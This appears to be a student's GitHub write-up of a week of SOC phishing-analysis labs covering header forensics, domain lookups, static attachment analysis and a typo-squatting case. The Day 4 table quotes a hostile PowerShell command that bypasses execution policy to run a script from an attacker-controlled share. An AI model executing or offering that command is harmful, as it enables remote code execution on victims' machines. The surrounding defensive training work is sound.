# Week 2: Phishing Analysis (Kali Linux SOC Focus)

## 🎯 Weekly Goal
Mastering manual email dissection, header forensics, and infrastructure investigation.

---

## 📅 Day 1: Email Fundamentals & Lab Basics
In this lab, I practiced navigating the Kali filesystem and using command-line tools to extract IOCs (Indicators of Compromise) from raw email files.

### Key Skills Demonstrated:
* **Directory Management:** Created a forensic workspace using `mkdir`.
* **Artifact Extraction:** Used `grep` to pull hidden URLs from a `.eml` file.
* **Network Recon:** Utilized `nslookup` and `whois` to verify domain legitimacy.

### Lab Evidence:
![Extracting URLs with Grep](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-20%20195313.png)
*Figure 1: Using grep to identify suspicious links.*

![Domain Investigation](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-20%20194934.png)
*Figure 2: Verifying the age and ownership of a suspicious domain.*

---

## 📅 Day 2: Email Headers & Spoofing Detection
Today I focused on the "invisible" envelope of an email to detect spoofing.

### Key Skills Demonstrated:
* **Header Analysis:** Compared `From` vs `Return-Path`.
* **Authentication Checks:** Verified `SPF` status to detect unauthorized senders.

### Lab Evidence:
![SPF Failure Detection](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-20%20204437.png)
*Figure 3: Identifying a spoofed sender via SPF fail results.*

---

## 📅 Day 3: URLs, Domains & Infrastructure Investigation

Today I focused on tracing malicious infrastructure — from a suspicious domain all the way to its physical hosting provider — using `whois` and `dig` in Kali Linux.

### Key Skills Demonstrated:

* **Domain Intelligence:** Used `whois vulnweb.com` to verify domain age, registrar legitimacy, and ownership status.
* **IP Attribution:** Used `dig vulnweb.com +short` to resolve the public IP, then traced it with `whois <IP>` to identify the hosting organization.
* **Heuristic Analysis:** Applied multi-signal analyst thinking to classify a simulated phishing URL as malicious based on TLD, protocol, and keyword patterns.

### Lab Evidence:

![WHOIS Domain Lookup - Part 1](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-22%20071932.png)
*Figure 4: `whois vulnweb.com` revealing Creation Date: 2010-06-14 and Registrar: Gandi SAS — both low-risk indicators.*

![WHOIS Domain Lookup - Part 2](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-22%20072008.png)
*Figure 5: Registrant Organization confirmed as `Invicti Security Limited`. Personal details REDACTED FOR PRIVACY — normal practice, not inherently suspicious.*

![IP WHOIS - AWS Attribution](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-22%20073716.png)
*Figure 6: `whois 44.228.249.3` tracing the resolved IP to Amazon Web Services (AWS), Seattle, WA — a neutral finding, as attackers frequently abuse cloud infrastructure.*

---

### 🔎 Final SOC Analysis Report

| Indicator | Finding | Risk Level |
|---|---|---|
| Domain Age | Created 2010 — 15+ years old | ✅ Low |
| Registrar | Gandi SAS (reputable, known registrar) | ✅ Low |
| Registrant | Invicti Security Limited (real company) | ✅ Low |
| Owner Privacy | REDACTED FOR PRIVACY | ⚠️ Neutral |
| Hosting Provider | Amazon Web Services (AWS), Seattle US | ⚠️ Neutral |
| Simulated Phishing URL | `http://microsoft-security-verify.xyz` | 🚨 HIGH |
| Protocol | Plaintext HTTP (no SSL) | 🚨 HIGH |
| TLD Pattern | `.xyz` — low-cost disposable domain | 🚨 HIGH |

**Conclusion:** The root domain `vulnweb.com` is a legitimate, long-standing security testing platform. However, the simulated phishing URL `http://microsoft-security-verify.xyz` displays three compounding red flags: an insecure protocol (HTTP), a disposable TLD (`.xyz`), and social engineering keywords in the path (`verify`, `security`). Classified as **MALICIOUS**.

> 🧠 **Key Analyst Lesson:** Cloud hosting (AWS, Azure, GCP) is not a safety signal. Attackers deliberately use trusted infrastructure to bypass reputation-based filters. Always combine multiple signals before making a verdict.

---

## 📅 Day 4: Attachments & Payload Thinking

Today I shifted focus from links to files — performing static analysis on suspicious 
attachments to extract hidden commands without ever executing them.

### Key Skills Demonstrated:

* **File Masquerading Detection:** Used `file` command to unmask an `invoice_details.docm` 
  disguised as a Word document — revealed as plain `ASCII text`, not a real `.docm`.
* **Hidden Payload Extraction:** Used `strings` and `grep` to surface a concealed 
  `powershell.exe -ExecutionPolicy Bypass` command buried inside the fake document.
* **Metadata Forensics:** Used `exiftool` to analyze `meeting_invite.pdf` and identified 
  critical inconsistencies — `MIME Type: text/plain` and `File Size: 17 bytes` — 
  exposing it as a fake PDF lure.

### Lab Evidence:

![Static Analysis - Payload Extraction & Metadata Forensics](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-22%20084642.png)
*Figure 7: `strings` + `grep` revealing hidden PowerShell execution bypass command inside 
a fake `.docm`, and `exiftool` exposing a 17-byte fake PDF with `MIME Type: text/plain`.*

---

### 🔎 Final SOC Analysis Report

| Artifact | Finding | Risk Level |
|---|---|---|
| `invoice_details.docm` | `file` identified as ASCII text — not a real Word doc | 🚨 CRITICAL |
| Hidden Command | `powershell.exe -ExecutionPolicy Bypass -File \\attacker-ip\payload.ps1` | 🚨 CRITICAL |
| `meeting_invite.pdf` | File size only 17 bytes — real PDFs are 50KB–500KB+ | ⚠️ HIGH |
| MIME Type | `text/plain` masquerading as `.pdf` | ⚠️ HIGH |

**Conclusion:** Both attachments were confirmed malicious lures using the **masquerading 
technique (T1036)**. The `.docm` file concealed a PowerShell command designed to 
bypass Windows security policies and reach back to an attacker-controlled IP. The 
fake `.pdf` was a delivery test dummy. Neither file required execution to detect — 
static analysis alone was sufficient to classify both as **CRITICAL threats**.

> 🧠 **Key Analyst Lesson:** A legitimate invoice sent to an accountant has **zero** 
> reason to contain a PowerShell script. Any office document triggering 
> `ExecutionPolicy Bypass` is an immediate escalation — no further confirmation needed.

---


## 📅 Day 5: Full Phishing Investigation (SOC Simulation)

Today I conducted a complete end-to-end phishing investigation, simulating a real SOC analyst workflow from evidence creation to final verdict.

**Key Skills Demonstrated:**

- **Header Forensics:** Used `grep` to extract `Return-Path`, `From`, and `Subject` — identified typo-squatted sender domain `microsft-verify.net` (missing the "o").
- **URL Extraction:** Used `grep "http"` to pull the malicious link from the raw email body.
- **Domain Intelligence:** Ran `whois` on the phishing domain — confirmed it does not exist in global WHOIS records ("The queried object does not exist").
- **DNS Analysis:** Ran `nslookup` — returned `NXDOMAIN`, meaning no active server exists behind the attacker's link.
- **Payload Analysis:** Identified a double-extension attack (`Security_Report.pdf.exe`) designed to disguise an executable as a PDF.
- **SOC Reporting:** Documented all IOCs into a structured incident verdict with recommended actions.

**Lab Evidence:**

![Header Analysis and WHOIS Output](https://github.com/YOUR_USERNAME/YOUR_REPO/blob/main/screenshots/day5_headers_whois.png?raw=true)
*Figure 5: grep exposing the spoofed Return-Path domain and whois confirming the phishing domain does not exist.*

![nslookup NXDOMAIN Result](https://github.com/YOUR_USERNAME/YOUR_REPO/blob/main/screenshots/day5_nslookup.png?raw=true)
*Figure 6: nslookup returning NXDOMAIN — no active infrastructure behind the malicious link.*
